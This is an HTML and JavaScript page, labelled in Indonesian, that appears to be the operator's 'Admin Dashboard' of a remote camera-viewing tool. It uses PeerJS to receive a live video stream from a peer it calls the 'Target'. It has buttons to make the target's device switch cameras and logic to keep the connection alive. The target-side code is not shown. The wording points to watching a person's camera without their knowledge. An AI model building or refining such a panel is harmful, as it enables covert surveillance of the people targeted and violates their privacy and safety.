<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-grad: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            --card-bg: rgba(255, 255, 255, 0.1);
            --accent: #00e676;
            --text-main: #ffffff;
            --text-muted: #b3b3b3;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-grad);
            color: var(--text-main);
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-y: auto;
            padding-bottom: 100px; /* Ruang kontrol bawah */
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 400px;
            margin-top: 40px;
            transition: all 0.5s ease;
        }

        h1 {
            font-weight: 600;
            font-size: 24px;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 30px;
        }

        /* Kotak ID */
        .id-wrapper {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 16px;
            cursor: pointer;
            position: relative;
            transition: transform 0.2s, background 0.2s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .id-wrapper:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        #my-peer-id {
            font-family: 'Courier New', monospace;
            font-size: 20px;
            color: #ffeb3b;
            letter-spacing: 1px;
            user-select: all;
            font-weight: bold;
        }

        .copy-icon {
            color: var(--text-muted);
            font-size: 14px;
            margin-left: 10px;
            opacity: 0.7;
        }

        /* Status Bar */
        .status {
            margin-top: 20px;
            font-size: 13px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-height: 20px;
        }

        .dot {
            width: 8px;
            height: 8px;
            background-color: #555;
            border-radius: 50%;
            display: inline-block;
        }
        .dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
        .dot.error { background-color: #ff4444; }

        #remote-video {
            width: 100%;
            max-width: 800px;
            height: auto;
            border-radius: 12px;
            margin-top: 20px;
            background: #000;
            display: none;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }

        /* Toast Notification */
        #toast {
            visibility: hidden;
            min-width: 200px;
            background-color: #333;
            color: #fff;
            text-align: center;
            border-radius: 50px;
            padding: 12px 24px;
            position: fixed;
            z-index: 1000;
            bottom: 30px;
            font-size: 14px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            opacity: 0;
            transition: opacity 0.3s, bottom 0.3s;
            border: 1px solid #444;
        }

        #toast.show {
            visibility: visible;
            opacity: 1;
            bottom: 50px;
        }

        /* --- KONTROL KAMERA ADMIN --- */
        #adminControls {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            padding: 12px 20px;
            border-radius: 40px;
            display: flex;
            gap: 20px;
            z-index: 100;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
            border: 1px solid rgba(255,255,255,0.1);
        }

        #adminControls.visible {
            opacity: 1;
            pointer-events: all;
        }

        .ctrl-btn {
            background: transparent;
            border: none;
            color: white;
            font-size: 22px;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            transition: background 0.2s, transform 0.1s;
        }

        .ctrl-btn:active {
            background: rgba(255,255,255,0.2);
            transform: scale(0.9);
        }

        .ctrl-btn.active {
            color: #ffeb3b;
            text-shadow: 0 0 10px rgba(255, 235, 59, 0.5);
        }

        /* Overlay Auto Reset */
        #resetOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s;
        }
        #resetOverlay.active { opacity: 1; pointer-events: all; }
        .reset-loader { width: 30px; height: 30px; border: 3px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 1s infinite; margin-bottom: 15px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <h1>ADMIN DASHBOARD</h1>
        <p class="subtitle">Salin ID unik ini untuk Target</p>

        <div class="id-wrapper" id="copyBtn">
            <span id="my-peer-id">Memuat...</span>
            <span class="copy-icon">ðŸ“‹ Salin</span>
        </div>

        <div class="status">
            <span class="dot" id="statusDot"></span>
            <span id="statusText">Menunggu koneksi server...</span>
        </div>
    </div>

    <!-- Video -->
    <video id="remote-video" autoplay playsinline></video>

    <!-- Kontrol Admin (Switch Kamera & Flash) -->
    <div id="adminControls">
        <span id="camModeLabel" style="font-size: 10px; color:#aaa; display:flex; align-items:center;">REMOTE</span>
        
        <!-- Switch Kamera -->
        <button class="ctrl-btn" id="btnSwitchCam" onclick="requestCameraSwitch()" title="Minta Target Ganti Kamera">
            ðŸ”„
        </button>
        
        <!-- Request Flash (Fungsi sama dengan switch di logika peerJS simple) -->
        <button class="ctrl-btn" id="btnFlash" onclick="requestCameraSwitch()" title="Trigger Kamera Ulang">
            âš¡
        </button>
    </div>

    <!-- Toast -->
    <div id="toast">ID Berhasil Disalin!</div>

    <!-- Overlay Auto Reset -->
    <div id="resetOverlay">
        <div class="reset-loader"></div>
        <p>Terjadi kesalah koneksi. Mereset ID...</p>
    </div>

<script>
    const idDisplay = document.getElementById('my-peer-id');
    const statusText = document.getElementById('statusText');
    const statusDot = document.getElementById('statusDot');
    const remoteVideo = document.getElementById('remote-video');
    const mainContainer = document.getElementById('mainContainer');
    const resetOverlay = document.getElementById('resetOverlay');
    const adminControls = document.getElementById('adminControls');
    
    // Variabel Koneksi
    let peer = null;
    let currentCall = null; 
    let targetPeerId = null; 
    let isManualSwitch = false; // Flag untuk membedakan switch manual vs disconnect jaringan

    // Load ID tersimpan
    let storedId = localStorage.getItem('my_admin_peer_id');
    let finalId = storedId ? storedId : null; 

    peer = new Peer(finalId, { debug: 2 });

    peer.on('open', (id) => {
        idDisplay.innerText = id;
        statusText.innerText = "Siap menerima koneksi.";
        statusDot.classList.add('active');
        localStorage.setItem('my_admin_peer_id', id);
    });

    peer.on('call', (call) => {
        targetPeerId = call.peer;
        currentCall = call;

        statusText.innerText = "Target terhubung...";
        
        // Sembunyikan UI Login, Tampilkan Video & Kontrol
        mainContainer.style.display = 'none';
        remoteVideo.style.display = 'block';
        
        // Munculkan tombol kontrol admin
        adminControls.classList.add('visible');

        // Jawab panggilan
        call.answer(); 

        call.on('stream', (remoteStream) => {
            remoteVideo.srcObject = remoteStream;
            statusText.innerText = "LIVE CONNECTED";
            statusDot.classList.add('active');
            
            // Jika ini hasil dari switch manual, beritahu user
            if (isManualSwitch) {
                showToast("Kamera Target Diupdate!");
                isManualSwitch = false; // Reset flag
            }
        });

        call.on('close', () => {
            handleDisconnect();
        });
    });

    peer.on('error', (err) => {
        console.error(err);
        const criticalErrors = ['peer-unavailable', 'unavailable-id', 'server-error', 'network'];
        if (criticalErrors.includes(err.type)) {
            triggerAutoReset();
        } else {
            statusText.innerText = "Error: " + err.type;
            statusDot.classList.remove('active');
            statusDot.classList.add('error');
        }
    });

    // --- FUNGSI SWITCH KAMERA / FLASH ---
    function requestCameraSwitch() {
        if (!currentCall || !targetPeerId) {
            showToast("Tidak ada target terhubung!");
            return;
        }

        // Set flag manual agar tidak dianggap error putus
        isManualSwitch = true;
        
        statusText.innerText = "Mengganti Kamera Target...";
        statusDot.classList.remove('active'); // Matikan indikator sebentar
        
        // 1. Tutup koneksi lama (ini akan memicu call.on('close'))
        currentCall.close();

        // 2. Panggil ulang target setelah delay singkat
        setTimeout(() => {
            reconnectToTarget();
        }, 800);
    }

    function reconnectToTarget() {
        if (!targetPeerId) return;

        const newCall = peer.call(targetPeerId, null);
        
        newCall.on('stream', (remoteStream) => {
            remoteVideo.srcObject = remoteStream;
            statusText.innerText = "LIVE CONNECTED";
            statusDot.classList.add('active');
        });

        newCall.on('close', () => {
            handleDisconnect();
        });

        currentCall = newCall; // Update referensi call
    }

    // --- HANDLE DISCONNECT (CERDAS) ---
    function handleDisconnect() {
        // Jika switch manual, JANGAN refresh. Biarkan fungsi reconnectToTarget yang bekerja.
        if (isManualSwitch) {
            return; 
        }

        // Jika bukan switch manual (misal jaringan putus), tampilkan error
        statusText.innerText = "Koneksi terputus. Mencoba menghubungkan...";
        statusDot.classList.remove('active');
        statusDot.classList.add('error');
        targetPeerId = null;

        // Coba reconnect otomatis setelah 3 detik
        setTimeout(() => {
            // Jika user menekan tombol switch saat putus, kita abaikan reconnect ini
            if(isManualSwitch) return;

            // Reload halaman untuk bersihkan state jika reconnect manual gagal
            // ATAU biarkan user refresh manual. Untuk stabilitas, kita biarkan state ini 
            // sampai user refresh, agar tidak loop reload terus menerus.
            statusText.innerText = "Koneksi putus. Silakan refresh atau tunggu target menghubungi.";
        }, 3000);
    }

    // --- UTILS ---
    function triggerAutoReset() {
        statusText.innerText = "Gagal memuat ID lama. Mengganti ID baru...";
        statusDot.classList.add('error');
        resetOverlay.classList.add('active');
        localStorage.removeItem('my_admin_peer_id');
        setTimeout(() => { location.reload(); }, 2000);
    }

    document.getElementById('copyBtn').addEventListener('click', () => {
        const text = idDisplay.innerText;
        if(text !== "Memuat..." && text !== "Error") {
            navigator.clipboard.writeText(text);
            showToast("ID Disalin!");
        }
    });

    function showToast(msg) {
        const toast = document.getElementById("toast");
        toast.innerText = msg || "ID Berhasil Disalin!";
        toast.className = "show";
        setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
    }
</script>

</body>
</html>
